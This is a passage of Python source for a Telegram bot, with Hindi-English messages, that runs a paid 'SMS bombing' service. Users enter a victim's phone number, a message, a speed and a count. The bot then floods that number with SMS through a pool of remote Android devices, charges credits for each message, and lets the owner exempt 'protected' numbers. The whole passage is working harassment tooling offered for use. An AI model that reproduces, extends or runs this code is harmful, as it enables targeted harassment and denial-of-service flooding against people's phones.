            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except Exception:
        await cq.message.answer(
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        await msg.answer(
            f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
            f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
            parse_mode="HTML"
        )
        return

    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:cancel", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"

    step4_text = (
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?"
    )
    step4_kb = InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:cancel", EMOJI_CROSS, "❌", style="danger")]])
    try:
        await cq.message.edit_text(step4_text, reply_markup=step4_kb, parse_mode="HTML")
    except Exception:
        await cq.message.answer(step4_text, reply_markup=step4_kb, parse_mode="HTML")

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>Aapke paas credits nahi hain!</b>\n\n"
                f"{em(EMOJI_MONEY, '💰')} Credits kharidne ke liye Admin se contact karein: {SUPER_ADMIN_NAME}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Aapke paas sirf {current_credits} credits hain! Ab {current_credits} bhej raha hoon...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]),
            parse_mode="HTML"
        )
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        return
    await state.set_state(S.owner_send_number)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except Exception:
        await cq.message.answer(
            f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    speed_map = {
        "owner:speed:fast": SPEED_FAST,
        "owner:speed:medium": SPEED_MEDIUM,
        "owner:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    step4_text = (
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?"
    )
    step4_kb = InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]])
    try:
        await cq.message.edit_text(step4_text, reply_markup=step4_kb, parse_mode="HTML")
    except Exception:
        await cq.message.answer(step4_text, reply_markup=step4_kb, parse_mode="HTML")

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        return
    await state.set_state(S.admin_send_number)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "admin:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except Exception:
        await cq.message.answer(
            f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "admin:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "admin:home", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    speed_map = {
        "admin:speed:fast": SPEED_FAST,
        "admin:speed:medium": SPEED_MEDIUM,
        "admin:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    count = len(devices)

    step4_text = (
        f"{speed_label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
        f"Kitne SMS bhejna hai?"
    )
    step4_kb = InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "admin:home", EMOJI_CROSS, "❌", style="danger")]])
    try:
        await cq.message.edit_text(step4_text, reply_markup=step4_kb, parse_mode="HTML")
    except Exception:
        await cq.message.answer(step4_text, reply_markup=step4_kb, parse_mode="HTML")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(
            f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                hist = d_temp.setdefault("sms_history", {}).setdefault(str(uid), [])
                                hist.append({
                                    "number": number,
                                    "message": message[:100],
                                    "timestamp": int(time.time()),
                                    "status": "sent"
                                })
                                if len(hist) > 200:
                                    d_temp["sms_history"][str(uid)] = hist[-200:]
                                save(d_temp)
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):
                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    d_final = load()
    if not is_regular_user:
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        hist = d_final.setdefault("sms_history", {}).setdefault(str(uid), [])
        hist.append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        if len(hist) > 200:
            d_final["sms_history"][str(uid)] = hist[-200:]
    else:
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
    save(d_final)

    duration = int(time.time() - start_time)
    d_log = load()
    log_activity(d_log, "sms_blast", uid, f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    icon = em(EMOJI_CHECK, "✅") if (sent_fail == 0 and sent_ok > 0) else em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"
    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(duration)}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back_btn = [
            btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")
        ]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya!")
    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>",
            parse_mode="HTML"
        )
    except Exception:
        pass

# ========== VIDEOS / PROTECTION / TRACKER / CREDITS / FIREBASE / ADMIN / OWNER ==========
def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]
    ]
    for idx, _ in enumerate(videos, 1):
        rows.append([
            btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑", style="danger")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    videos = d.get("videos", [])
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
            reply_markup=videos_menu_kb(d),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    await state.set_state(S.add_video)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:videos:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()

    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return

    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer()
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    else:
        await cq.answer()
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer()
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Videos Deleted!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos", []):
        await cq.answer("❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.protect_number)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\nJis number ko protect karna hai woh enter karo:\n<i>Example: +919876543210</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:", parse_mode="HTML")
        return
    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    log_activity(d, "number_protected", uid, f"Protected {number}")
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{number}</code>",
